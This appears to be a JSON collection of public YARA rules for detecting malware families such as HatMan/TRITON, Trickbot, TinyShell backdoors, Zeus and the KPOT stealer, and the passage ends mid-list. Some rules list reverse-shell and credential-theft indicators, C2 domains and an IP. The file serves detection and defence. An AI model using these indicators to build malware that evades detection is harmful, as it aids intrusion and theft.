  "hatman_nullsub": "rule hatman_nullsub : hatman {\n    strings:\n        $nullsub     = { ff ff 60 38  02 00 00 44  20 00 80 4e }\n    condition:\n        $nullsub\n}",
  "hatman_origaddr": "rule hatman_origaddr : hatman {\n    strings:\n        $oaddr_be   = { 3c 60 00 03  60 63 96 f4  4e 80 00 20 }\n        $oaddr_le   = { 03 00 60 3c  f4 96 63 60  20 00 80 4e }\n    condition:\n        $oaddr_be or $oaddr_le\n}",
  "hatman_origcode": "rule hatman_origcode : hatman {\n    strings:\n        $ocode_be   = { 3c 00 00 03  60 00 a0 b0  7c 09 03 a6  4e 80 04 20 }\n        $ocode_le   = { 03 00 00 3c  b0 a0 00 60  a6 03 09 7c  20 04 80 4e }\n    condition:\n        $ocode_be or $ocode_le\n}",
  "hatman_mftmsr": "rule hatman_mftmsr : hatman {\n    strings:\n        $mfmsr_be   = { 7c 63 00 a6 }\n        $mfmsr_le   = { a6 00 63 7c }\n        $mtmsr_be   = { 7c 63 01 24 }\n        $mtmsr_le   = { 24 01 63 7c }\n    condition:\n        ($mfmsr_be and $mtmsr_be) or ($mfmsr_le and $mtmsr_le)\n}",
  "hatman_loadoff": "rule hatman_loadoff : hatman {\n    strings:\n        $loadoff_be = { 80 60 00 04  48 00 ?? ??  70 60 ff ff  28 00 00 00\n                        40 82 ?? ??  28 03 00 00  41 82 ?? ??              }\n        $loadoff_le = { 04 00 60 80  ?? ?? 00 48  ff ff 60 70  00 00 00 28 \n                        ?? ?? 82 40  00 00 03 28  ?? ?? 82 41              }\n    condition:\n        $loadoff_be or $loadoff_le\n}",
  "hatman_injector_int": "rule hatman_injector_int : hatman {\n    condition:\n        hatman_memcpy and hatman_origaddr and hatman_loadoff\n}",
  "hatman_payload_int": "rule hatman_payload_int : hatman {\n    condition:\n        hatman_memcpy and hatman_origcode and hatman_mftmsr\n}",
  "hatman_compiled_python": "rule hatman_compiled_python : hatman {\n    condition:\n        filesize < 100KB and hatman_nullsub and hatman_setstatus and hatman_dividers\n}",
  "hatman_injector": "rule hatman_injector : hatman {\n    condition:\n        filesize < 100KB and hatman_injector_int and not hatman_payload_int\n}",
  "hatman_payload": "rule hatman_payload : hatman {\n    condition:\n        filesize < 100KB and hatman_payload_int and not hatman_injector_int\n}",
  "hatman_combined": "rule hatman_combined : hatman {\n    condition:\n        filesize < 100KB and hatman_injector_int and hatman_payload_int and hatman_dividers\n}",
  "hatman": "rule hatman : hatman {\n    meta:\n        author = \"DHS/NCCIC/ICS-CERT\"\n        description = \"Matches the known samples of the HatMan malware.\"\n    condition:\n        filesize < 100KB and hatman_compiled_python or hatman_injector or hatman_payload\n            or hatman_combined\n}",
  "TRITON_ICS_FRAMEWORK": "rule TRITON_ICS_FRAMEWORK\n{\n      meta:\n          author = \"nicholas.carr @itsreallynick\"\n          md5 = \"0face841f7b2953e7c29c064d6886523\"\n          description = \"TRITON framework recovered during Mandiant ICS incident response\"\n      strings:\n          $python_compiled = \".pyc\" nocase ascii wide\n          $python_module_01 = \"__module__\" nocase ascii wide\n          $python_module_02 = \"<module>\" nocase ascii wide\n          $python_script_01 = \"import Ts\" nocase ascii wide\n          $python_script_02 = \"def ts_\" nocase ascii wide  \n\n          $py_cnames_01 = \"TS_cnames.py\" nocase ascii wide\n          $py_cnames_02 = \"TRICON\" nocase ascii wide\n          $py_cnames_03 = \"TriStation \" nocase ascii wide\n          $py_cnames_04 = \" chassis \" nocase ascii wide  \n\n          $py_tslibs_01 = \"GetCpStatus\" nocase ascii wide\n          $py_tslibs_02 = \"ts_\" ascii wide\n          $py_tslibs_03 = \" sequence\" nocase ascii wide\n          $py_tslibs_04 = /import Ts(Hi|Low|Base)[^:alpha:]/ nocase ascii wide\n          $py_tslibs_05 = /module\\s?version/ nocase ascii wide\n          $py_tslibs_06 = \"bad \" nocase ascii wide\n          $py_tslibs_07 = \"prog_cnt\" nocase ascii wide  \n\n          $py_tsbase_01 = \"TsBase.py\" nocase ascii wide\n          $py_tsbase_02 = \".TsBase(\" nocase ascii wide \n         \n          $py_tshi_01 = \"TsHi.py\" nocase ascii wide\n          $py_tshi_02 = \"keystate\" nocase ascii wide\n          $py_tshi_03 = \"GetProjectInfo\" nocase ascii wide\n          $py_tshi_04 = \"GetProgramTable\" nocase ascii wide\n          $py_tshi_05 = \"SafeAppendProgramMod\" nocase ascii wide\n          $py_tshi_06 = \".TsHi(\" ascii nocase wide  \n\n          $py_tslow_01 = \"TsLow.py\" nocase ascii wide\n          $py_tslow_02 = \"print_last_error\" ascii nocase wide\n          $py_tslow_03 = \".TsLow(\" ascii nocase wide\n          $py_tslow_04 = \"tcm_\" ascii wide\n          $py_tslow_05 = \" TCM found\" nocase ascii wide  \n\n          $py_crc_01 = \"crc.pyc\" nocase ascii wide\n          $py_crc_02 = \"CRC16_MODBUS\" ascii wide\n          $py_crc_03 = \"Kotov Alaxander\" nocase ascii wide\n          $py_crc_04 = \"CRC_CCITT_XMODEM\" ascii wide\n          $py_crc_05 = \"crc16ret\" ascii wide\n          $py_crc_06 = \"CRC16_CCITT_x1D0F\" ascii wide\n          $py_crc_07 = /CRC16_CCITT[^_]/ ascii wide  \n\n          $py_sh_01 = \"sh.pyc\" nocase ascii wide  \n\n          $py_keyword_01 = \" FAILURE\" ascii wide\n          $py_keyword_02 = \"symbol table\" nocase ascii wide  \n\n          $py_TRIDENT_01 = \"inject.bin\" ascii nocase wide\n          $py_TRIDENT_02 = \"imain.bin\" ascii nocase wide  \n\n      condition:\n          2 of ($python_*) and 7 of ($py_*) and filesize < 3MB\n}",
  "Tedroo": "rule Tedroo : Spammer\n{\n\tmeta:\n\t\tauthor=\"Kevin Falcoz\"\n\t\tdate=\"22/11/2015\"\n\t\tdescription=\"Tedroo Spammer\"\n\n\tstrings:\n\t\t$signature1={25 73 25 73 2E 65 78 65}\n\t\t$signature2={5F 6C 6F 67 2E 74 78 74}\n\n\tcondition:\n\t\t$signature1 and $signature2\n}",
  "Tinba2": "rule Tinba2 : banking {\n        meta:\n                author = \"n3sfox <n3sfox@gmail.com>\"\n                date = \"2015/11/07\"\n                description = \"Tinba 2 (DGA) banking trojan\"\n                reference = \"https://securityintelligence.com/tinba-malware-reloaded-and-attacking-banks-around-the-world\"\n                filetype = \"memory\"\n                hash1 = \"c7f662594f07776ab047b322150f6ed0\"\n                hash2 = \"dc71ef1e55f1ddb36b3c41b1b95ae586\"\n                hash3 = \"b788155cb82a7600f2ed1965cffc1e88\"\n\n        strings:\n                $str1 = \"MapViewOfFile\"\n                $str2 = \"OpenFileMapping\"\n                $str3 = \"NtCreateUserProcess\"\n                $str4 = \"NtQueryDirectoryFile\"\n                $str5 = \"RtlCreateUserThread\"\n                $str6 = \"DeleteUrlCacheEntry\"\n                $str7 = \"PR_Read\"\n                $str8 = \"PR_Write\"\n                $pubkey = \"BEGIN PUBLIC KEY\"\n                $code1 = {50 87 44 24 04 6A ?? E8}\n\n        condition:\n                all of ($str*) and $pubkey and $code1\n}",
  "is__osx": "rule is__osx\n{\n meta:\n    date = \"2018-02-12\"\n    author = \"@unixfreaxjp\"\n condition:\n    uint32(0) == 0xfeedface     or uint32(0) == 0xcafebabe\n    or uint32(0) == 0xbebafeca  or uint32(0) == 0xcefaedfe\n    or uint32(0) == 0xfeedfacf  or uint32(0) == 0xcffaedfe\n}",
  "priv01": "rule priv01 {\n meta:\n    date = \"2018-02-11\"\n    author = \"@unixfreaxjp\"\n strings:\n    $vara01 = { 73 3A 70 3A 00 }\n    $vara02 = \"Usage: %s\" fullword nocase wide ascii\n    $vara03 = \"[ -s secret ]\" fullword nocase wide ascii\n    $vara04 = \"[ -p port ]\" fullword nocase wide ascii\n condition:\n    all of them\n}",
  "priv03": "rule priv03 {\n meta:\n    date = \"2018-02-10\"\n    author = \"@unixfreaxjp\"\n strings:\n    $varb01 = { 41 57 41 56 41 55 41 54 55 53 0F B6 06 }\n    $varb02 = { 48 C7 07 00 00 00 00 48 C7 47 08 00 00 }\n    $vard01 = { 55 48 89 E5 41 57 41 56 41 55 41 54 53 }\n    $vard02 = { 55 48 89 E5 48 C7 47 08 00 00 00 00 48 }\n    // can be added\n condition:\n    (2 of ($varb*)) or (2 of ($vard*))\n}",
  "priv04": "rule priv04 {\n meta:\n    date = \"2018-02-11\"\n    author = \"@unixfreaxjp\"\n strings:\n    $varb03 = { 89 DF E8 FB A4 FF FF 83 C3 01 81 FB 00 04 }\n    $vard03 = { 66 89 05 7D 5E 00 00 }\n    // can be added\n condition:\n    1 of them\n}",
  "priv02": "rule priv02 {\n meta:\n    date = \"2018-02-10\"\n    author = \"@unixfreaxjp\"\n strings:\n    $vare01 = \"socket\" fullword nocase wide ascii\n    $vare02 = \"connect\" fullword nocase wide ascii\n    $vare03 = \"alarm\" fullword nocase wide ascii\n    $vare04 = \"dup2\" fullword nocase wide ascii\n    $vare05 = \"execl\" fullword nocase wide ascii\n    $vare06 = \"openpty\" fullword nocase wide ascii\n    $vare07 = \"putenv\" fullword nocase wide ascii\n    $vare08 = \"setsid\" fullword nocase wide ascii\n    $vare09 = \"ttyname\" fullword nocase wide ascii\n    $vare00 = \"waitpid\" fullword nocase wide ascii\n    $varc01 = \"HISTFIL\" fullword nocase wide ascii\n    $varc02 = \"TERML\" fullword nocase wide ascii\n    $varc03 = \"/bin/sh\" fullword nocase wide ascii\n condition:\n    (5 of ($vare*)\n    or (2 of ($varc*)))\n}",
  "MALW_TinyShell_backconnect_OSX": "rule MALW_TinyShell_backconnect_OSX {\n meta:\n    date = \"2018-02-10\"\n    author = \"@unixfreaxjp\"\n condition:\n    is__osx\n    and priv01\n    and priv02\n    and priv03\n    and priv04\n    and filesize < 100KB\n}",
  "MALW_TinyShell_backconnect_ELF": "rule MALW_TinyShell_backconnect_ELF {\n meta:\n    date = \"2018-02-10\"\n    author = \"@unixfreaxjp\"\n condition:\n    is__elf\n    and priv01\n    and ((priv02)\n      or ((priv03)\n        or (priv04)))\n    and filesize < 100KB\n}",
  "MALW_TinyShell_backconnect_Gen": "rule MALW_TinyShell_backconnect_Gen {\n meta:\n    date = \"2018-02-11\"\n    author = \"@unixfreaxjp\"\n condition:\n    ((is__elf) or  (is__osx))\n    and priv01\n    and priv02\n    and filesize < 100KB\n}",
  "MALW_TinyShell_backdoor_Gen": "rule MALW_TinyShell_backdoor_Gen {\n meta:\n    date = \"2018-02-11\"\n    author = \"@unixfreaxjp\"\n condition:\n    ((is__elf) or  (is__osx))\n    and priv01\n    and filesize > 20KB\n}",
  "ELF_Linux_Torte_domains": "rule ELF_Linux_Torte_domains {\n\tmeta:\n\t\tauthor = \"@mmorenog,@yararules\"\n\t\tdescription = \"Detects ELF Linux/Torte infection\"\n\t\tref1 = \"http://blog.malwaremustdie.org/2016/01/mmd-0050-2016-incident-report-elf.html\"\n\tstrings:\n\t\t$1 = \"pages.touchpadz.com\" ascii wide nocase\n\t\t$2 = \"bat.touchpadz.com\" ascii wide nocase\n\t\t$3 = \"stat.touchpadz.com\" ascii wide nocase\n\t\t$4 = \"sk2.touchpadz.com\" ascii wide nocase\n\n\tcondition:\n\t\tany of them\n}",
  "TreasureHunt": "rule TreasureHunt\n  {\n    meta:\n      author = \"Minerva Labs\"\n      ref =\"http://www.minerva-labs.com/#!Cybercriminals-Adopt-the-Mossad-Emblem/c7a5/573da2d60cf2f90ca6f6e3ed\"\n      date = \"2016/06\"\n      maltype = \"Point of Sale (POS) Malware\"\n      filetype = \"exe\"\n\n    strings:\n      $a = \"treasureHunter.pdb\"\n      $b = \"jucheck\"\n      $c = \"cmdLineDecrypted\"\n\n    condition:\n      all of them\n}",
  "MALW_trickbot_bankBot": "rule MALW_trickbot_bankBot : Trojan\n{\nmeta:\n author = \"Marc Salinas @Bondey_m\"\n description = \"Detects Trickbot Banking Trojan\"\nstrings:\n$str_trick_01 = \"moduleconfig\"\n$str_trick_02 = \"Start\"\n$str_trick_03 = \"Control\"\n$str_trick_04 = \"FreeBuffer\"\n$str_trick_05 = \"Release\"\ncondition:\nall of ($str_trick_*)\n}",
  "MALW_systeminfo_trickbot_module": "rule MALW_systeminfo_trickbot_module :\nTrojan\n{\nmeta:\nauthor = \"Marc Salinas @Bondey_m\"\ndescription = \"Detects systeminfo module from Trickbot Trojan\"\nstrings:\n$str_systeminf_01 = \"<program>\"\n$str_systeminf_02 = \"<service>\"\n$str_systeminf_03 = \"</systeminfo>\"\n$str_systeminf_04 =\n\"GetSystemInfo.pdb\"\n$str_systeminf_05 = \"</autostart>\"\n$str_systeminf_06 = \"</moduleconfig>\"\ncondition:\nall of ($str_systeminf_*)\n}",
  "MALW_dllinject_trickbot_module": "rule MALW_dllinject_trickbot_module : Trojan\n{\nmeta:\nauthor = \"Marc Salinas @Bondey_m\"\ndescription = \" Detects dllinject module from Trickbot Trojan\"\nstrings:\n$str_dllinj_01 = \"user_pref(\"\n$str_dllinj_02 = \"<ignore_mask>\"\n$str_dllinj_03 = \"<require_header>\"\n$str_dllinj_04 = \"</dinj>\"\ncondition:\nall of ($str_dllinj_*)\n}",
  "MALW_mailsercher_trickbot_module": "rule MALW_mailsercher_trickbot_module :\nTrojan\n{\nmeta:\nauthor = \"Marc Salinas @Bondey_m\"\ndescription = \" Detects mailsearcher module from Trickbot Trojan\"\nstrings:\n$str_mails_01 = \"mailsearcher\"\n$str_mails_02 = \"handler\"\n$str_mails_03 = \"conf\"\n$str_mails_04 = \"ctl\"\n$str_mails_05 = \"SetConf\"\n$str_mails_06 = \"file\"\n$str_mails_07 = \"needinfo\"\n$str_mails_08 = \"mailconf\"\ncondition:\nall of ($str_mails_*)\n}",
  "TrumpBot": "rule TrumpBot : MALW\n{\n\tmeta:\n\t\tdescription = \"TrumpBot\"\n\t\tauthor = \"Joan Soriano / @joanbtl\"\n\t\tdate = \"2017-04-16\"\n\t\tversion = \"1.0\"\n\t\tMD5 = \"77122e0e6fcf18df9572d80c4eedd88d\"\n\t\tSHA1 = \"108ee460d4c11ea373b7bba92086dd8023c0654f\"\n\n\tstrings:\n\t\t$string = \"trumpisdaddy\"\n\t\t$ip = \"198.50.154.188\"\n\tcondition:\n\t\t all of them\n}",
  "Upatre_Hazgurut": "rule Upatre_Hazgurut {\n\tmeta:\n\t\tdescription = \"Detects Upatre malware - file hazgurut.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://weankor.vxstream-sandbox.com/sample/6b857ef314938d37997c178ea50687a281d8ff9925f0c4e70940754643e2c0e3?environmentId=7\"\n\t\tdate = \"2015-10-13\"\n\t\tscore = 70\n\t\thash1 = \"7ee0d20b15e24b7fe72154d9521e1959752b4e9c20d2992500df9ac096450a50\"\n\t\thash2 = \"79ffc620ddb143525fa32bc6a83c636168501a4a589a38cdb0a74afac1ee8b92\"\n\t\thash3 = \"62d8a6880c594fe9529158b94a9336179fa7a3d3bf1aa9d0baaf07d03b281bd3\"\n\t\thash4 = \"c64282aca980d558821bec8b3dfeae562d9620139dc43d02ee4d1745cd989f2a\"\n\t\thash5 = \"a35f9870f9d4b993eb094460b05ee1f657199412807abe6264121dd7cc12aa70\"\n\t\thash6 = \"f8cb2730ebc8fac1c58da1346ad1208585fe730c4f03d976eb1e13a1f5d81ef9\"\n\t\thash7 = \"b65ad7e2d299d6955d95b7ae9b62233c34bc5f6aa9f87dc482914f8ad2cba5d2\"\n\t\thash8 = \"6b857ef314938d37997c178ea50687a281d8ff9925f0c4e70940754643e2c0e3\"\n\t\thash9 = \"33a288cef0ae7192b34bd2ef3f523dfb7c6cbc2735ba07edf988400df1713041\"\n\t\thash10 = \"2a8e50afbc376cb2a9700d2d83c1be0c21ef942309676ecac897ba4646aba273\"\n\t\thash11 = \"3d0f2c7e07b7d64b1bad049b804ff1aae8c1fc945a42ad555eca3e1698c7f7d3\"\n\t\thash12 = \"951360b32a78173a1f81da0ded8b4400e230125d05970d41621830efc5337274\"\n\t\thash13 = \"bd90faebfd7663ef89b120fe69809532cada3eb94bb94094e8bc615f70670295\"\n\t\thash14 = \"8c5823f67f9625e4be39a67958f0f614ece49c18596eacc5620524bc9b6bad3d\"\n\tstrings:\n\t\t$a1 = \"barcod\" fullword ascii\n\n\t\t$s0 = \"msports.dll\" fullword ascii\n\t\t$s1 = \"nddeapi.dll\" fullword ascii\n\t\t$s2 = \"glmf32.dll\" fullword ascii\n\t\t$s3 = \"<requestedExecutionLevel level=\\\"requireAdministrator\\\" uiAccess=\\\"false\\\">\" fullword ascii\n\t\t$s4 = \"cmutil.dll\" fullword ascii\n\t\t$s5 = \"mprapi.dll\" fullword ascii\n\t\t$s6 = \"glmf32.dll\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1500KB\n\t\tand $a1 in (0..4000)\n\t\tand all of ($s*)\n}",
  "urausy_skype_dat": "rule urausy_skype_dat : memory {\n\tmeta:\n\t\tauthor = \"AlienVault Labs\"\n\t\tdescription = \"Yara rule to match against memory of processes infected by Urausy skype.dat\"\n\tstrings:\n\t\t$a = \"skype.dat\" ascii wide\n\t\t$b = \"skype.ini\" ascii wide\n\t\t$win1 = \"CreateWindow\"\n\t\t$win2 = \"YIWEFHIWQ\" ascii wide\n\t\t$desk1 = \"CreateDesktop\"\n\t\t$desk2 = \"MyDesktop\" ascii wide\n\tcondition:\n\t\t$a and $b and (all of ($win*) or all of ($desk*))\n}",
  "Vidgrab": "rule Vidgrab : Family\n{\n    meta:\n        description = \"Vidgrab\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-20\"\n        \n    condition:\n        VidgrabCode or VidgrabStrings\n}",
  "VirutFileInfector": "rule VirutFileInfector\n{\n\tmeta:\n    \tauthor = \"D00RT <@D00RT_RM>\"\n    \tdata = \"2017/08/04\"\n\n        description = \"Virut (unknown version) fileinfector detection\"\n        reference = \"http://reversingminds-blog.logdown.com\"\n\n        infected_sample1 = \"5755f09d445a5dcab3ea92d978c7c360\"\n        infected_sample2 = \"68e508108ed94c8c391c70ef1d15e0f8\"\n        infected_sample2 = \"2766e8e78ee10264cf1a3f5f4a16ff00\"\n\n\tstrings:\n    \t$sign = { F9 E8 22 00 00 00 ?? 31 EB 56 }\n        $func = { 52 C1 E9 1D 68 31 D4 00 00 58 5A 81 C1 94 01 00 00 80 4D 00 F0 89 6C 24 04 F7 D1 81 6C 24 04 }       \n \n    condition:\n    \t$sign and $func\n}",
  "volgmer": "rule volgmer\n{\nmeta:\n    description = \"Malformed User Agent\"\n    ref = \"https://www.us-cert.gov/ncas/alerts/TA17-318B\"\nstrings:\n    $s = \"Mozillar/\"\ncondition:\n    (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and $s\n}",
  "Wabot": "rule Wabot : Worm\n{\n\tmeta:\n\t\tauthor=\"Kevin Falcoz\"\n\t\tdate=\"14/08/2015\"\n\t\tdescription=\"Wabot Trojan Worm\"\n\n\tstrings:\n\t\t$signature1={43 3A 5C 6D 61 72 69 6A 75 61 6E 61 2E 74 78 74}\n\t\t$signature2={73 49 52 43 34}\n\n\tcondition:\n\t\t$signature1 and $signature2\n}",
  "Warp": "rule Warp : Family\n{\n    meta:\n        description = \"Warp\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-07-10\"\n        \n    condition:\n        WarpCode or WarpStrings\n}",
  "Wimmie": "rule Wimmie : Family\n{\n    meta:\n        description = \"Wimmie family\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-07-17\"\n   \n    condition:\n        WimmieShellcode or WimmieStrings\n        \n}",
  "XHide": "rule XHide: MALW\n{\n\tmeta:\n\t\tdescription = \"XHide - Process Faker\"\n\t\tauthor = \"Joan Soriano / @w0lfvan\"\n\t\tdate = \"2017-12-01\"\n\t\tversion = \"1.0\"\n\t\tMD5 = \"c644c04bce21dacdeb1e6c14c081e359\"\n\t\tSHA256 = \"59f5b21ef8a570c02453b5edb0e750a42a1382f6\"\n\tstrings:\n\t\t$a = \"XHide - Process Faker\"\n\t\t$b = \"Fakename: %s PidNum: %d\"\n\tcondition:\n\t\tall of them\n}",
  "XMRIG_Miner": "rule XMRIG_Miner\n{\n\tmeta:\n  ref = \"https://gist.github.com/GelosSnake/c2d4d6ef6f93ccb7d3afb5b1e26c7b4e\"\n  strings:\n    $a1 = \"stratum+tcp\"\n    condition:\n    $a1  \n}",
  "XOR_DDosv1": "rule XOR_DDosv1 : DDoS\n{\n  meta:\n    author = \"Akamai CSIRT\"\n    description = \"Rule to detect XOR DDos infection\"\n  strings:\n    $st0 = \"BB2FA36AAA9541F0\"\n    $st1 = \"md5=\"\n    $st2 = \"denyip=\"\n    $st3 = \"filename=\"\n    $st4 = \"rmfile=\"\n    $st5 = \"exec_packet\"\n    $st6 = \"build_iphdr\"\n  condition:\n    all of them\n}",
  "Yayih": "rule Yayih : Family\n{\n    meta:\n        description = \"Yayih\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-07-11\"\n        \n    condition:\n        YayihCode or YayihStrings\n}",
  "yordanyan_activeagent": "rule yordanyan_activeagent {\n\tmeta:\n\t\tdescription = \"Memory string yara for Yordanyan ActiveAgent\"\n\t\tauthor = \"J from THL <j@techhelplist.com>\"\n\t\treference1 = \"https://www.virustotal.com/#/file/a2e34bfd5a9789837bc2d580e87ec11b9f29c4a50296ef45b06e3895ff399746/detection\"\n\t\treference2 = \"ETPRO TROJAN Win32.ActiveAgent CnC Create\"\n\t\tdate = \"2018-10-04\"\n\t\tmaltype = \"Botnet\"\n\t\tfiletype = \"memory\"\n\n\tstrings:\n\t\t// the wide strings are 16bit bigendian strings in memory. strings -e b memdump.file\n\t\t$s01 = \"I'm KeepRunner!\" wide\n\t\t$s02 = \"I'm Updater!\" wide\n\t\t$s03 = \"Starting Download...\" wide\n\t\t$s04 = \"Download Complete!\" wide\n\t\t$s05 = \"Running New Agent and terminating updater!\" wide\n\t\t$s06 = \"Can't Run downloaded file!\" wide\n\t\t$s07 = \"Retrying download and run!\" wide\n\t\t$s08 = \"Can't init Client.\" wide\n\t\t$s09 = \"Client initialised -\" wide\n\t\t$s10 = \"Client not found!\" wide\n\t\t$s11 = \"Client signed.\" wide\n\t\t$s12 = \"GetClientData\" wide\n\t\t$s13 = \"&counter=\" wide\n\t\t$s14 = \"&agent_file_version=\" wide\n\t\t$s15 = \"&agent_id=\" wide\n\t\t$s16 = \"mac_address=\" wide\n\t\t$s17 = \"Getting Attachments\" wide\n\t\t$s18 = \"public_name\" wide\n\t\t$s19 = \"Yor agent id =\" wide\n\t\t$s20 = \"Yor agent version =\" wide\n\t\t$s21 = \"Last agent version =\" wide\n\t\t$s22 = \"Agent is last version.\" wide\n\t\t$s23 = \"Updating Agent\" wide\n\t\t$s24 = \"Terminating RunKeeper\" wide\n\t\t$s25 = \"Terminating RunKeeper: Done\" wide\n\t\t$s26 = \"ActiveAgent\" ascii\n\t\t$s27 = \"public_name\" ascii\n\n\tcondition:\n\t\t15 of them\n\n}",
  "Zegost": "rule Zegost : Trojan\n{\n\tmeta:\n\t\tauthor=\"Kevin Falcoz\"\n\t\tdate=\"10/06/2013\"\n\t\tdescription=\"Zegost Trojan\"\n\t\t\n\tstrings:\n\t\t$signature1={39 2F 66 33 30 4C 69 35 75 62 4F 35 44 4E 41 44 44 78 47 38 73 37 36 32 74 71 59 3D}\n\t\t$signature2={00 BA DA 22 51 42 6F 6D 65 00}\n\t\t\n\tcondition:\n\t\t$signature1 and $signature2\n}",
  "Windows_Malware_Zeus": "rule Windows_Malware_Zeus : Zeus_1134\n    {\n            meta:\n                    author = \"Xylitol xylitol@malwareint.com\"\n                    date = \"2014-03-03\"\n                    description = \"Match first two bytes, protocol and string present in Zeus 1.1.3.4\"\n                    reference = \"http://www.xylibox.com/2014/03/zeus-1134.html\"\n                    \n            strings:\n                    $mz = {4D 5A}\n                    $protocol1 = \"X_ID: \"\n                    $protocol2 = \"X_OS: \"\n                    $protocol3 = \"X_BV: \"\n                    $stringR1 = \"InitializeSecurityDescriptor\"\n                    $stringR2 = \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1)\"\n            condition:\n                    ($mz at 0 and all of ($protocol*) and ($stringR1 or $stringR2))\n    }",
  "Adwind": "rule Adwind\n{\nmeta:\n        author=\"Asaf Aprozper, asafa AT minerva-labs.com\"\n        description = \"Adwind RAT\"\n        reference = \"https://minerva-labs.com/post/adwind-and-other-evasive-java-rats\"\n        last_modified = \"2017-06-25\"\nstrings:\n        $a0 = \"META-INF/MANIFEST.MF\"\n        $a1 = /Main(\\$)Q[0-9][0-9][0-9][0-9]/\n        $PK = \"PK\"\ncondition:\n        $PK at 0 and $a0 and $a1\n}",
  "hancitor": "rule hancitor {\n\tmeta:\n\t\tdescription = \"Memory string yara for Hancitor\"\n\t\tauthor = \"J from THL <j@techhelplist.com>\"\n\t\treference1 = \"https://researchcenter.paloaltonetworks.com/2018/02/threat-brief-hancitor-actors/\"\n\t\treference2 = \"https://www.virustotal.com/#/file/43e17f30b78c085e9bda8cadf5063cd5cec9edaa7441594ba1fe51391cc1c486/\"\n\t\treference3 = \"https://www.virustotal.com/#/file/d135f03b9fdc709651ac9d0264e155c5580b072577a8ff24c90183b126b5e12a/\"\n\t\tdate = \"2018-09-18\"\n\t\tmaltype1 = \"Botnet\"\n\t\tfiletype = \"memory\"\n\n\tstrings:\n\t\t$a = \"GUID=\"\tascii\n                $b = \"&BUILD=\"\tascii\n                $c = \"&INFO=\"\tascii\n                $d = \"&IP=\"\tascii\n                $e = \"&TYPE=\" \tascii\n                $f = \"php|http\"\tascii\n\t\t$g = \"GUID=%I64u&BUILD=%s&INFO=%s&IP=%s&TYPE=1&WIN=%d.%d\" ascii fullword\n\n\n\tcondition:\n\t\t5 of ($a,$b,$c,$d,$e,$f) or $g\n\n}",
  "mimikatz_kirbi_ticket": "rule mimikatz_kirbi_ticket\n{\n\tmeta:\n\t\tdescription\t\t= \"KiRBi ticket for mimikatz\"\n\t\tauthor\t\t\t= \"Benjamin DELPY (gentilkiwi); Didier Stevens\"\n\n\tstrings:\n\t\t$asn1\t\t\t= { 76 82 ?? ?? 30 82 ?? ?? a0 03 02 01 05 a1 03 02 01 16 }\n\t\t$asn1_84\t\t= { 76 84 ?? ?? ?? ?? 30 84 ?? ?? ?? ?? a0 84 00 00 00 03 02 01 05 a1 84 00 00 00 03 02 01 16 }\n\n\tcondition:\n\t\t$asn1 at 0 or $asn1_84 at 0\n}",
  "kpot": "rule kpot\n{\n\n    meta:\n        author = \" J from THL <j@techhelplist.com>\"\n        date = \"2018-08-29\"\n        reference1 = \"https://www.virustotal.com/#/file/4e87a0794bf73d06ac1ce4a37e33eb832ff4c89fb9e4266490c7cef9229d27a7/detection\"\n        reference2 = \"ETPRO TROJAN KPOT Stealer Check-In [2832358]\"\n        reference3 = \"ETPRO TROJAN KPOT Stealer Exfiltration [2832359]\"\n        version = 1\n        maltype = \"Stealer\"\n        filetype = \"memory\"\n\n    strings:\n        $text01 = \"bot_id=%s\"\n        $text02 = \"x64=%d\"\n        $text03 = \"is_admin=%d\"\n        $text04 = \"IL=%d\"\n        $text05 = \"os_version=%d\"\n        $text06 = \"IP: %S\"\n        $text07 = \"MachineGuid: %s\"\n        $text08 = \"CPU: %S (%d cores)\"\n        $text09 = \"RAM: %S MB\"\n        $text10 = \"Screen: %dx%d\"\n        $text11 = \"PC: %s\"\n        $text12 = \"User: %s\"\n        $text13 = \"LT: %S (UTC+%d:%d)\"\n        $text14 = \"%s/%s.php\"\n        $text15 = \"Host: %s\"\n        $text16 = \"username_value\"\n        $text17 = \"password_value\"\n        $text18 = \"name_on_card\"\n        $text19 = \"last_four\"\n        $text20 = \"exp_month\"\n        $text21 = \"exp_year\"\n        $text22 = \"bank_name\"\n\n\n    condition:\n        16 of them\n}",
  "marap": "rule marap \n{\n\n    meta:\n        author = \" J from THL <j@techhelplist.com>\"\n        date = \"2018-08-19\"\n        reference1 = \"https://www.virustotal.com/#/file/61dfc4d535d86359c2f09dbdd8f14c0a2e6367e5bb7377812f323a94d32341ba/detection\"\n        reference2 = \"https://www.virustotal.com/#/file/c0c85f93a4f425a23c2659dce11e3b1c8b9353b566751b32fcb76b3d8b723b94/detection\"\n        reference3 = \"https://threatpost.com/highly-flexible-marap-malware-enters-the-financial-scene/136623/\"\n        reference4 = \"https://www.bleepingcomputer.com/news/security/necurs-botnet-pushing-new-marap-malware/\"\n        version = 1\n        maltype = \"Downloader\"\n        filetype = \"memory\"\n\n    strings:\n        $text01 = \"%02X-%02X-%02X-%02X-%02X-%02X\" wide\n        $text02 = \"%s, base=0x%p\" wide\n        $text03 = \"pid=%d\" wide\n        $text04 = \"%s %s\" wide\n        $text05 = \"%d|%d|%s|%s|%s\" wide\n        $text06 = \"%s|1|%d|%d|%d|%d|%d|%s\" wide\n        $text07 = \"%d#%s#%s#%s#%d#%s#%s#%d#%s#%s#%s#%s#%d\" wide\n        $text08 = \"%s|1|%d|%d|%d|%d|%d|%s#%s#%s#%s#%d#%d#%d\" wide\n        $text09 = \"%s|0|%d\" wide\n        $text10 = \"%llx\" wide\n        $text11 = \"%s -a\" wide\n\n    condition:\n        7 of them\n}",
